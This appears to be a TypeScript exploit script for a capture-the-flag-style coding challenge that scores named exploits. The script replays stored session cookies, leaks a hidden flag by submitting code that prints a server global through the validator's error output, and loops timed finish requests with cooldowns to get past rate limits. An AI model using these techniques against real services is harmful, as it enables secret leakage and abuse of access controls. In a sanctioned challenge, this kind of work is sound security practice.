// Retry L1 startSession->finish until speed_demon fires. v3 folds ~1.2-1.8s of server-side finish
// processing into the speed_demon clock, so a sub-1s finish only happens when the backend is briefly fast
// (server variance — iboum caught it in 5 tries). This loops the tight finish and stops on the first hit,
// banking the full 1270 (speed_demon +100 + flag_finder +150) since it also sends the cached/leaked flag.
//
//   unset CHEETCODE_GITHUB_PAT   # prefer fast cookie auth
//   CHEETCODE_GITHUB=trimaxeng2 \
//   CHEETCODE_FINGERPRINT_HINTS_PATH=recon-output/safari-session-2026-08-28T0008/fingerprint-hints.json \
//   npx tsx src/level1-speed-hunt.ts
//
// Env: SPEED_HUNT_MAX_ATTEMPTS (default 40), SPEED_HUNT_DELAY_MS (default 4000, backoff between tries).
// ponytail: run it during an off-peak (US late-night) window; it hunts server variance unattended.
import { promises as fs } from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { setTimeout as delay } from "node:timers/promises";
import { loadEnvFile } from "./env.js";
import { buildCookieHeader, buildFingerprintHints, elapsedForSession } from "./level1/api.js";
import { solveKnownProblem, extractFunctionName } from "./level1/solutions.js";
import type { LevelSession, FinishResponse, CheetProblem } from "./level1/types.js";
import { OUTPUT_ROOT, TARGET_URL, STORAGE_STATE_PATH } from "./recon/capture.js";

loadEnvFile();

const github = (process.env.CHEETCODE_GITHUB || "").trim();
if (!github) throw new Error("Set CHEETCODE_GITHUB.");
const MAX_ATTEMPTS = Number(process.env.SPEED_HUNT_MAX_ATTEMPTS ?? 40);
// ponytail: the server hard-429s after ~3 rapid finishes, so hunt PATIENTLY: wide spacing between real attempts,
// and a long cooldown when rate-limited (429s don't count as attempts). Tune via env.
const DELAY_MS = Number(process.env.SPEED_HUNT_DELAY_MS ?? 30000);
const COOLDOWN_MS = Number(process.env.SPEED_HUNT_COOLDOWN_MS ?? 90000);
function isRateLimited(e: unknown): boolean {
  return e instanceof Error && / 429:/.test(e.message);
}

const storage = JSON.parse(await fs.readFile(STORAGE_STATE_PATH, "utf8"));
const cookie = buildCookieHeader(storage.cookies, new URL(TARGET_URL).hostname);
const hintsPath = process.env.CHEETCODE_FINGERPRINT_HINTS_PATH;
const fingerprintHints = hintsPath
  ? JSON.parse(await fs.readFile(hintsPath, "utf8"))
  : buildFingerprintHints(crypto.randomBytes(16).toString("hex"), Date.now());
const headers: Record<string, string> = {
  "content-type": "application/json",
  referer: TARGET_URL,
  cookie,
  "x-client-fingerprint": fingerprintHints.fingerprintId
};
// ponytail: cookie auth is the fast path; only add Bearer if a PAT is explicitly set (and you accept the slower auth).
if (process.env.CHEETCODE_GITHUB_PAT) headers["authorization"] = `Bearer ${process.env.CHEETCODE_GITHUB_PAT}`;

async function post<T>(urlPath: string, body: unknown): Promise<T> {
  const r = await fetch(new URL(urlPath, TARGET_URL), { method: "POST", headers, body: JSON.stringify(body) });
  const text = await r.text();
  if (!r.ok) throw new Error(`${urlPath} ${r.status}: ${text.slice(0, 200)}`);
  return JSON.parse(text) as T;
}

// --- resolve the flag once (cache -> else leak via the validate failedCase.actual channel) ---
async function resolveFlag(): Promise<string | undefined> {
  const cachePath = path.join(OUTPUT_ROOT, `.flag-${github}.txt`);
  try {
    const cached = (await fs.readFile(cachePath, "utf8")).trim();
    if (cached) return cached;
  } catch {
    /* leak below */
  }
  const s = await post<LevelSession>("/api/session", { level: 1, isDev: false, fingerprintHints });
  const p0 = (s.problems as CheetProblem[])[0];
  const name = extractFunctionName(p0.signature);
  if (!name) return undefined;
  const res = await post<{ failedCase?: { actual?: unknown } }>("/api/level-1/validate", {
    sessionId: s.sessionId,
    problemId: p0.id,
    code: `function ${name}(){ return String(globalThis.__ORCHARD_CTX__); }`
  });
  const actual = res.failedCase?.actual;
  const flag = typeof actual === "string" ? actual.trim() : "";
  if (flag && flag.includes("{")) {
    await fs.writeFile(cachePath, flag, "utf8");
    return flag;
  }
  return undefined;
}

const flag = await resolveFlag();
console.log(`flag ${flag ? "ready" : "MISSING (flag_finder will not fire)"}; hunting speed_demon over ${MAX_ATTEMPTS} attempts, ${DELAY_MS}ms apart\n`);

let best = -1;
let bestScore = 0;
let realAttempts = 0;
let rateLimitHits = 0;
for (let attempt = 1; attempt <= MAX_ATTEMPTS; ) {
  try {
    const session = await post<LevelSession>("/api/session", { level: 1, isDev: false, fingerprintHints });
    const submissions = (session.problems as CheetProblem[])
      .map(solveKnownProblem)
      .map((s) => ({ problemId: s.problemId, code: s.code }));
    const body: Record<string, unknown> = {
      sessionId: session.sessionId,
      github,
      timeElapsed: elapsedForSession(session),
      submissions
    };
    if (flag) body.flag = flag;
    const finish = await post<FinishResponse>("/api/level-1/finish", body);
    const a = finish.attempt as any;
    const ids: string[] = (a.exploits ?? []).map((e: any) => e?.id);
    const tr = a.timeRemaining;
    if (tr > best) best = tr;
    if (a.score > bestScore) bestScore = a.score;
    realAttempts++;
    const hit = ids.includes("speed_demon");
    console.log(`  #${attempt} (real ${realAttempts}): timeRemaining=${tr} score=${a.score} exploits=[${ids.join(",")}]${hit ? "  <== SPEED DEMON!" : ""}`);
    if (hit) {
      console.log(`\n★ speed_demon fired on attempt ${attempt}: score=${a.score} (banked). Done.`);
      process.exit(0);
    }
    attempt++;
    if (attempt <= MAX_ATTEMPTS) await delay(DELAY_MS);
  } catch (e) {
    if (isRateLimited(e)) {
      rateLimitHits++;
      // ponytail: 429s don't count as attempts — cool down (escalating) and retry the same slot.
      const wait = COOLDOWN_MS * Math.min(4, rateLimitHits);
      console.log(`  #${attempt}: rate limited — cooling down ${Math.round(wait / 1000)}s (hit #${rateLimitHits})`);
      await delay(wait);
    } else {
      console.log(`  #${attempt}: error ${e instanceof Error ? e.message : String(e)}`);
      attempt++;
      if (attempt <= MAX_ATTEMPTS) await delay(DELAY_MS);
    }
  }
}
console.log(`\nNo speed_demon in ${realAttempts} real attempts (${rateLimitHits} rate-limit cooldowns). Best timeRemaining=${best} (need 59), best score=${bestScore}.`);
console.log(best <= 58
  ? "Backend consistently >1s for this path — the fast finish isn't reachable from here; a co-located run is the only reliable path."
  : "Saw timeRemaining reach 59 at least once — keep hunting at this hour, it's catchable.");
